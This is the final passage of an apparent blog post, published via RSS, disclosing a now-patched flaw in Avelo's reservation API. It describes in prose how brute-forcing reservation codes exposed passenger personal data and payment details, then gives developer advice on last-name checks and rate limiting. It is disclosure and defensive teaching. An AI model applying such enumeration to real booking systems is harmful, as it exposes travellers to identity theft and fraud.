    <p><img src="https://alexschapiro.com/assets/images/avelo-security/payment.png" alt="Payment card data in API response"></p><p>Example of exposed payment card data returned by the API</p>
  </div>
  <div>
    <p><img src="https://alexschapiro.com/assets/images/avelo-security/ktn.png" alt="Known Traveler Number in API response"></p><p>Example of exposed Known Traveler Number (KNT) and other PII in API response</p>
  </div>
</div>

<h2 id="the-fallout">The Fallout</h2>

<p>This flaw was critical. An attacker could:</p>

<ol>
  <li>Run the 6-hour brute-force attack to enumerate millions of valid passenger reservation codes (PNRs) — or simply run the script for a few minutes and start harvesting valid passenger data immediately</li>
  <li>Extract comprehensive PII including full names, dates of birth, contact information, flight itineraries, and government ID numbers (Known Traveler Numbers and passport numbers) for identity theft and fraud</li>
  <li>Access partial payment card data including last 4 digits, expiration dates, and billing zip codes</li>
  <li>View complete travel history and passenger boarding status</li>
  <li>Modify or cancel all Avelo passengers’ reservations, causing widespread travel disruption</li>
</ol>

<p>I immediately disclosed this to the Avelo team. They were responsive, professional, and took the findings seriously, patching the issues promptly.</p>

<h2 id="key-takeaways">Key Takeaways</h2>

<p>This incident is a stark reminder of how critical simple security checks are. A single missing <code>lastName</code> check and an absent rate-limit configuration exposed millions of sensitive passenger records to trivial enumeration.</p>

<p><strong>For developers:</strong></p>
<ul>
  <li>Always require multiple factors for accessing sensitive data (e.g., confirmation code + last name)</li>
  <li>Implement rate limiting on all enumerable endpoints</li>
  <li>Ensure authentication cookies are properly scoped to user sessions</li>
</ul>

<p>I’m glad we could get this fixed, and I hope this write-up helps other developers avoid similar pitfalls.</p>



  </div>
</article>

      </div></div>]]></description>
        </item>
    </channel>
</rss>